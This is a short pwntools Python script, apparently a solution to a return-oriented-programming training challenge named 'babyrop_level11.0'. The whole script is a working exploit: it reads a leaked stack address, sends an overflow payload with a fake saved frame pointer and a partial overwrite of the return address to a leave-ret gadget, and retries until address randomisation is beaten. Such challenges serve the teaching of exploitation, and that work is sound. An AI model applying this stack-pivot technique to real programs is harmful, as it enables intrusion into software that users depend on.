from pwn import *
while True:
    p = process("/challenge/babyrop_level11.0")

    leave_ret = 0x27AF
    p.recvuntil("located at: ")
    leak = int(p.recvuntil(".")[:-1], 16)
    fake_rbp = leak - 0x10
    buf = b"A" * 0x48

    payload = buf + p64(fake_rbp) + p16(leave_ret)
    p.send(payload)
    all = p.recvall()
    if b"pwn" in all:
        print(all)
        break
    p.close()